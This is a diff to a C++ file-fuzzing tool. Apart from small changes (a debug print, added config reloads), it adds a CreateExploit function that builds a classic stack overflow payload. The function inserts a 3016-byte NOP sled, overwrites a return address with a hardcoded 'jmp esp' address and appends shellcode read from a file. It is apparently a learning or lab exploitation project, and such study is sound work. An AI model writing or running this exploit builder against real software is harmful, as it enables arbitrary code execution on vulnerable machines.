@@ -136,6 +136,8 @@ ChangeBytes(size_t __offset, uint32_t __bytes, size_t __count) {
     _Log("Config file not loaded", true);
     return;
   }
+  
+  std::cout << __len << '\n';
 
   if (__offset > __len - 1) {
     _Log("Offset greater than file size", true);
@@ -401,6 +403,7 @@ void
 MyProgram::Fuzzer::
 ChangeAutoFuzzer() {
   Backup();
+  LoadConfig();
 
   // Run program until all replacement occurs
   // byte
@@ -456,6 +459,7 @@ void
 MyProgram::Fuzzer::
 AppendAutoFuzzer() {
   Backup();
+  LoadConfig();
 
   // Run program till first crash or all possible values is over
 
@@ -471,6 +475,54 @@ AppendAutoFuzzer() {
    SaveConfig();
    if (DryRun()) { break; }
   }
+}
+
+void
+MyProgram::Fuzzer::
+CreateExploit() {
+
+  std::vector<uint8_t> _shellcode;
+  std::fstream __shellFile(
+    "shellcode.bin",
+    std::fstream::in | std::fstream::binary
+  );
+
+  if (!__shellFile.is_open()) {
+    _Log("Cannot open shellcode file", true);
+    return;
+  }
+
+  __shellFile.seekg(0, __shellFile.end);
+  auto __length = __shellFile.tellg();
+  __shellFile.seekg(0, __shellFile.beg);
+
+  _shellcode.clear();
+  _shellcode.reserve(size_t(__length));
+  
+  for (size_t i = 0; i < __length; ++i) {
+    _shellcode.push_back(uint8_t(__shellFile.get()));
+  }
+
+  __shellFile.close();
+
+  if (_shellcode.size() != __length) { return; }
+
+  // start from initial config
+  Backup();
+  LoadConfig();
+
+  DeleteByte(size_t(0x30), _data.size() - 0x30);
+
+  InsertByte(size_t(0x30), 0x90, 3016);
+
+  // 0x62501297 - jmp esp addr
+  ChangeBytes(size_t(3012 + 0x30), 0x62501297, 1);
+
+  _data.insert(_data.end(), _shellcode.begin(), _shellcode.end());
+
+  ChangeBytes(0x10, _data.size() -  0x30, 1);
+
+  SaveConfig();
 }
 
 uint8_t
